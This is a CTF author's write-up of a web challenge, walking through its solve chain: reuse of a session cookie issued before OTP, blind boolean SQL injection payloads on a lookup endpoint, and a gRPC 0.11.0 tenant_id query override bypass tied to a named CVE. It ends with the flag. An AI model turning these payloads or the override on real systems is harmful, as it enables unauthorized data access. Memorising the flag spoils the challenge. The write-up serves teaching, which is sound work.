+++
title = 'We need to talk | CAT CTF 26'
date = '2026-09-12T00:00:00-04:00'
draft = false
slug = 'tenantexchange'
description = 'Chaining pre-OTP session issue, blind SQLi oracle, and grpc 0.11.0 tenant_id override to read a restricted Initech document.'
tags = ["Web", "CTF", "SQLi", "Auth-Bypass", "gRPC Override", "Hard"]
+++

Hey Everyone, this is the write-up of the web challenge "We need to talk" I created in in CAT CTF 26 that was only solved 5 times over +600 teams. Let's gooooo.

<img width="627" height="676" alt="Screenshot 2026-09-14 142722" src="https://github.com/user-attachments/assets/5fe6670b-ec60-41f7-bfda-c7ec48d6ff9d" />


The challenge gives us a web app with a normal analyst login / registration flow. The end goal is to read a restricted **Initech** incident document `IR-4472` while we are only an **Acme** user, and the flag is appended at runtime only when we get that document.

**The intended chain is:**

1. Find and reuse the pre-OTP `tv_session`.
2. Prove `/exchange/lookup` is a blind SQLi boolean oracle and dump the Initech doc UUID.
3. Bypass the tenant guard with `grpc 0.11.0` query override `?tenant_id=initech-inc`.
4. Chain everything in one solver to get the flag.

After opening the challenge players will get this landing login / register page.

<img width="1327" height="796" alt="Screenshot 2026-09-14 145512" src="https://github.com/user-attachments/assets/99d76663-0196-4663-9ba9-32c04886ee3d" />

# Recon - What I Want Players To Do

I designed the flow so players must register a new Acme analyst account.

They make a request to `/register` with normal fields name / email / password, plus a `_csrf_token`.

I enforce password constraints, so they need something strong like:

```
test1@Test
```

After register + login, my app redirects them to `/otp`. The OTP page says email verification is required.


I made the OTP endpoint never accept a code on purpose, so brute forcing the OTP is a dead.

But the interesting thing I left, if they see the login response in Burp, it has already set a trusted cookie:

```http
Set-Cookie: tv_session=COOKIE_VALUE; path=/; HttpOnly; SameSite=Lax
```

**What does this mean?**

- Normally the flow should be: login -> verify OTP -> get session.
- Here my flow is: login -> get session -> ask for OTP.

So I issue the session **before** OTP verification is completed. This is the classic pre-auth session issue I wanted them to find. The intended move is to reuse this `tv_session` cookie directly on app routes:

```bash
curl -b 'tv_session=COOKIE_VALUE' http://IP:PORT/notifications
```

And THEY HAVE access. They are logged in without ever solving OTP. That's greatttt.

The notifications page is where I expose 3 very important hints:

- Acme-owned API document links under `/api/v1/tenants/acme-corp/documents/<uuid>`.
- A blocked external Initech delivery reference: `IR-4472`.
- A link to `/docs/`.
![[Pasted image 20260914145908.png]]
## Published Docs

If they try `robots.txt`, `/admin`, `/.git/HEAD` they won't get anything, but I intentionally left `/docs/` open:

```bash
curl http://HOST:4000/docs/
```

I enabled directory listing. Let's goo and see what I put inside:

```bash
curl http://HOST:4000/docs/build/mix.lock
curl http://HOST:4000/docs/build/schema.sql
curl -o tenantexchange.protoset http://HOST:4000/docs/descriptors/tenantexchange.protoset
```

1. `mix.lock` gives them the vulnerable dependency:

```text
grpc 0.11.0
```

Save this version number, they will need it later for the last step.

2. `schema.sql` gives them the relevant tables and columns I want them to use:

```sql
tenants(id, slug, ...)
documents(id, tenant_id, title, body, classification, ...)
sessions(token_hash, tenant_id, ...)
```

So they already know table names `tenants`, `documents` and columns `slug`, `classification`, `body`. This will make their SQLi much easie

3. `tenantexchange.protoset` is the protobuf descriptor I left. Decode it to know the API shape I transcoded:

```bash
protoc --decode_raw < tenantexchange.protoset
```

The descriptor reveals the transcoded route built:

```text
GET /api/v1/tenants/{tenant_id}/documents/{doc_id}
```

So now they know the API is `GET /api/v1/tenants/{tenant_id}/documents/{doc_id}` and it is transcoded via grpc.

## Blind SQL Injection in /exchange/lookup (Oracle)

My mission for them now is to get the Initech document UUID, because I made the flag body **not** in SQL, but the Initech document UUID is. I read the flag from `FLAG` at runtime only.

The delivery lookup endpoint I made vulnerable looks like:

```bash
curl -b 'tv_session=COOKIE_VALUE' \
  'http://HOST:4000/exchange/lookup?q=IR-4472'
```

It designed to answer like this:

- If the query matches, the response contains:

```text
Pending tenant verification
```

- If it does not match, the response contains:

```text
No routed object found
```

This is a **boolean oracle** planted. What is boolean oracle?

> It means app answers them with True / False (two different messages) depending on their query. They can abuse this to ask the database yes/no questions one character at a time and exfiltrate data.

As I built it, if they write a `'` in the `q` parameter they will get an error / different behavior. Just test with `' OR 1=1-- -` and they will get --> `Pending tenant verification`, so SQLi is confirmed as intended.

Now their attack should be blind boolean-based to get the restricted Initech UUID I seeded.

The vulnerable query I wrote searches restricted Initech documents. They must recover it one character at a time with payloads like I verified:

```sql
blabla%' OR EXISTS (
  SELECT 1
  FROM documents dx
  JOIN tenants tx ON tx.id = dx.tenant_id
  WHERE tx.slug = 'initech-inc'
    AND dx.classification = 'restricted'
    AND dx.body ILIKE '%IR-4472%'
    AND substring(dx.id::text,1,1) = 'a'
)--
```

**Payload Explanation:**

- `blabla%'` --> close the original LIKE query written and make it return nothing, so only their injected part decides the answer.
- `OR EXISTS (SELECT 1 ...)` --> if their inner SELECT returns a row, the whole condition is True.
- `tx.slug='initech-inc'` --> target only Initech tenant I seeded.
- `dx.classification='restricted'` --> target only restricted docs I seeded.
- `dx.body ILIKE '%IR-4472%'` --> target the doc that contains my blocked reference.
- `substring(dx.id::text,1,1)='a'` --> guess position 1 is `a`? If yes my app returns `Pending tenant verification`, if no it returns `No routed object found`.
- `--` --> comment out the rest.

URL-encoded example for position 1 = `a` I tested:

```bash
blabla%25%27%20OR%20EXISTS%20(SELECT%201%20FROM%20documents%20dx%20JOIN%20tenants%20tx%20ON%20tx.id=dx.tenant_id%20WHERE%20tx.slug=%27initech-inc%27%20AND%20dx.classification=%27restricted%27%20AND%20dx.body%20ILIKE%20%27%25IR-4472%25%27%20AND%20substring(dx.id::text,1,1)=%27a%27)--"
```

They just loop positions `1..36` with alphabet `0123456789abcdef-` (UUID chars) until they recover the full doc UUID I generated.

`NOTE:` This can be done using SQLmap too, and dump the whole database btw 

## gRPC 0.11.0 Override

There is a published CVE [CVE-2026-48599][https://vulners.com/vulnrichment/VULNRICHMENT:CVE-2026-48599] --> Authorization bypass via path binding override in elixir-grpc/grpc HTTP transcoding, which this is the core bug of the challenge.

Now they have the Initech UUID, I expect them to try to read it directly and fail as I designed:

```bash
/api/v1/tenants/initech-inc/documents/INITECH_UUID
```

They will get:

```json
{"error":"tenant denied"}
```

That's expected and intended. Their session is Acme, and my guard checks the route tenant from Cowboy path bindings. Direct Initech path with Acme session always returns `403`.

But remember that `grpc 0.11.0` version I left in `mix.lock`? That's the final bug I planted.

**What is grpc transcoder bug I abused?**

- My guard sees the tenant from the URL path: `/api/v1/tenants/acme-corp/...` -> `acme-corp`, so allowed.
- My document handler sees the tenant from the protobuf request `tenant_id` field.
- Because `grpc 0.11.0` merges path bindings **first** and query parameters **later** for `body: ""` routes, the query string can **override** the protobuf `tenant_id` seen by my handler.

So they must keep the authorized Acme tenant in the path, but override `tenant_id` in the query as I intended:

```bash
/api/v1/tenants/acme-corp/documents/INITECH_UUID?tenant_id=initech-inc
```

My guard sees `acme-corp` and allows the request. My document handler sees `initech-inc`, loads the restricted Initech document, and appends the runtime flag. That's greatttt.

After this request they get the flag:

```json
{
  "body": "Incident IR-4472 final escalation packet. Release is blocked until tenant ownership is verified. Flag: CATF{pr3_07p_535510n_bl1nd_5ql1_grpc_73n4n7_0v3rr1d3}",
  "classification": "restricted",
  "tenantId": "initech-inc",
  "title": "Incident IR-4472 Escalation"
}
```

Their Flag is: `CATF{pr3_07p_535510n_bl1nd_5ql1_grpc_73n4n7_0v3rr1d3}`

# Resources

- Blind SQL injection boolean oracle technique I built
- grpc 0.11.0 HTTP transcoder query override behavior I abused [CVE-2026-48599][https://vulners.com/vulnrichment/VULNRICHMENT:CVE-2026-48599]
- UUID exfiltration via `substring(id::text,pos,1)` I left as the only way

Happy Hacking :)
